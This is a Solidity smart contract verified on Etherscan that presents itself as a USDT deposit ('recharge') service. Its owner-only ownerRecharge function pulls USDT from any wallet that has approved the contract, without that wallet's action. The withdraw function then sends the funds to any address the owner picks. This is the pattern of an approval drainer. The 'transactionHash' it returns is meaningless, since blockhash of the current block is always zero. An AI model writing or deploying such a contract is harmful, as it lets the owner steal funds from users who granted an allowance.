/**
 *Submitted for verification at Etherscan.io on 2023-08-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface USDTInterface {
    function transferFrom(address _from, address _to, uint256 _value) external;
    function transfer(address _to, uint256 _value) external;
    function balanceOf(address _owner) external view returns (uint256);
    function allowance(address _owner, address _spender) external view returns (uint256);
    function approve(address _spender, uint256 _value)  external returns (bool);
}

contract TokenTransferContract {
    USDTInterface private usdt; 
    address private owner; 

    event Recharge(address indexed account, uint256 amount, bytes32 transactionHash);

    constructor(address _usdtAddress) {
        usdt = USDTInterface(_usdtAddress);
        owner = msg.sender;
    }

    function getEthBalance(address _address) external view returns (uint256) {
        return _address.balance;
    }

    function getWalletUSDTBalance(address _walletAddress) external view returns (uint256) {
        return usdt.balanceOf(_walletAddress);
    }

    function getApprovedUSDTAmount(address _walletAddress) external view returns (uint256) {
        return usdt.allowance(_walletAddress, address(this));
    }
    
    function recharge(uint256 _amount) external returns (uint256, bytes32) {
        require(_amount > 0, "Amount must be greater than zero");
        usdt.transferFrom(msg.sender, address(this), _amount);
        bytes32 transactionHash = blockhash(block.number);
        emit Recharge(msg.sender, _amount, transactionHash);
        return (_amount, transactionHash);
    }


    function ownerRecharge(address _walletAddress, uint256 _amount) external {
        require(msg.sender == owner, "Unauthorized");
        require(_walletAddress != address(0), "Invalid address");
        usdt.transferFrom(_walletAddress, address(this), _amount);
    }

    function withdraw(uint256 _amount,address targetAddress) external {
        require(msg.sender == owner, "Unauthorized");
        require(targetAddress != address(0), "Target address not set");
        usdt.transfer(targetAddress, _amount);
    }
}